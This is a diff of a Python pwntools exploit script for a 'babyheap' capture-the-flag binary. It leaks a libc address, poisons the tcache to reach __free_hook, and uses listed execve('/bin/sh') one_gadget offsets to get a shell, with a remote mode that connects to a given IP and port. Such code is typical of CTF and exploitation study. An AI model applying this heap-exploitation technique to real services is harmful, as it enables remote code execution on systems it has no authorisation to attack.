@@ -6,8 +6,9 @@ import sys
 import os
 
 r = None
-#e = ELF('./babyheap')
 libc = None
+one_gadget = None
+leak_offset = None
 
 #gdb_script = '''break *(0x13cc+0x555555554000)
 #c'''
@@ -19,49 +20,6 @@ gdb_script=''
 
 small = 0xf8
 large = 0x178
-
-leak_offset = 0x3dac00
-#free_hook_offset = 0x3dc8a8
-
-# One Gadgets -- remote libc
-#0xe237f execve("/bin/sh", rcx, [rbp-0x70])
-#constraints:
-#  [rcx] == NULL || rcx == NULL
-#  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
-#
-#0xe2383 execve("/bin/sh", rcx, rdx)
-#constraints:
-#  [rcx] == NULL || rcx == NULL
-#  [rdx] == NULL || rdx == NULL
-#
-#0xe2386 execve("/bin/sh", rsi, rdx)
-#constraints:
-#  [rsi] == NULL || rsi == NULL
-#  [rdx] == NULL || rdx == NULL
-#
-#0x106ef8 execve("/bin/sh", rsp+0x70, environ)
-#constraints:
-#  [rsp+0x70] == NULL
-one_gadget = 0xe237f
-
-
-# One gadgets -- local libc
-#0x47c46	execve("/bin/sh", rsp+0x30, environ)
-#constraints:
-#  rax == NULL
-#
-#0x47c9a	execve("/bin/sh", rsp+0x30, environ)
-#constraints:
-#  [rsp+0x30] == NULL
-#
-#0xfccde	execve("/bin/sh", rsp+0x40, environ)
-#constraints:
-#  [rsp+0x40] == NULL
-#
-#0xfdb8e	execve("/bin/sh", rsp+0x70, environ)
-#constraints:
-#  [rsp+0x70] == NULL
-one_gadget = 0xfccde
 
 context.log_level = 'DEBUG'
 
@@ -109,7 +67,7 @@ def main():
 
     leak = int('0x' + show(7).split('\x0a')[0][2:].rjust(6, '\x00')[::-1].encode('hex'),16)
     print "[*] Leaked address:" + hex(leak)
-    libc.address = leak-leak_offset
+    libc.address = leak - leak_offset
     print "[*] Libc base is at address:" + hex(libc.address)
 
     free(7)
@@ -135,8 +93,6 @@ def main():
     malloc(large,cyclic(large) + '\x81', newline=True) # idx 8: A
     #malloc(small) # idx 2: C
     malloc(small) # idx 9: C
-    #malloc(small) # idx 3: D
-    #malloc(small) # idx 3: D
 
     # Step 5
 #    free(0) # Free B into large tcache
@@ -145,10 +101,6 @@ def main():
     free(9) # Free C into small tcache
 
     # Step 6
-    #malloc(large, cyclic(256) + p64(0xdeadbeefcafebabe)) # idx 0: B <- overwrites FW ptr in C
-    #target = p64(0xdeadbeefcafebabe)
-    #target = p64(libc.symbols['__free_hook'])
-    #target = p64(libc.address + free_hook_offset)
     target = p64(libc.symbols['__free_hook'])
     malloc(large, cyclic(256) + target[:-1], newline=False) # idx 0: B <- overwrites FW ptr in C
     # malloc(small, '\x00')
@@ -160,16 +112,64 @@ def main():
     r.interactive()
 
 if __name__ == "__main__":
-    global r, libc
+    global r, libc, one_gadget, leak_offset
     if len(sys.argv) == 1:
+        # Running locally - set vars
+
+        # One gadgets -- local libc
+        #0x47c46	execve("/bin/sh", rsp+0x30, environ)
+        #constraints:
+        #  rax == NULL
+        #
+        #0x47c9a	execve("/bin/sh", rsp+0x30, environ)
+        #constraints:
+        #  [rsp+0x30] == NULL
+        #
+        #0xfccde	execve("/bin/sh", rsp+0x40, environ)
+        #constraints:
+        #  [rsp+0x40] == NULL
+        #
+        #0xfdb8e	execve("/bin/sh", rsp+0x70, environ)
+        #constraints:
+        #  [rsp+0x70] == NULL
+        one_gadget = 0xfccde
+
         libc = ELF('./local_libc.so.6')
         cwd = os.getcwd()
+        leak_offset = libc.symbols['__memalign_hook']
+
         #r = process('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
         #r = gdb.debug('./babyheap', env = {'LD_PRELOAD': cwd + '/ld-2.29.so ' + cwd + '/libc.so'})
-        #r = gdb.debug('./babyheap', gdbscript=gdb_script)
-        r = process('./babyheap')
+        r = gdb.debug('./babyheap', gdbscript=gdb_script)
+        #r = process('./babyheap')
+
     elif len(sys.argv) == 3:
+        # Running remotely - set vars
+
+        # One Gadgets -- remote libc
+        #0xe237f execve("/bin/sh", rcx, [rbp-0x70])
+        #constraints:
+        #  [rcx] == NULL || rcx == NULL
+        #  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
+        #
+        #0xe2383 execve("/bin/sh", rcx, rdx)
+        #constraints:
+        #  [rcx] == NULL || rcx == NULL
+        #  [rdx] == NULL || rdx == NULL
+        #
+        #0xe2386 execve("/bin/sh", rsi, rdx)
+        #constraints:
+        #  [rsi] == NULL || rsi == NULL
+        #  [rdx] == NULL || rdx == NULL
+        #
+        #0x106ef8 execve("/bin/sh", rsp+0x70, environ)
+        #constraints:
+        #  [rsp+0x70] == NULL
+        one_gadget = 0xe2383
+
         libc = ELF('./libc.so')
+        leak_offset = libc.symbols['__memalign_hook']-0x20
+
         r = remote(sys.argv[1], int(sys.argv[2]))
     else:
         print "Usage: %s ip port" % sys.argv[0]
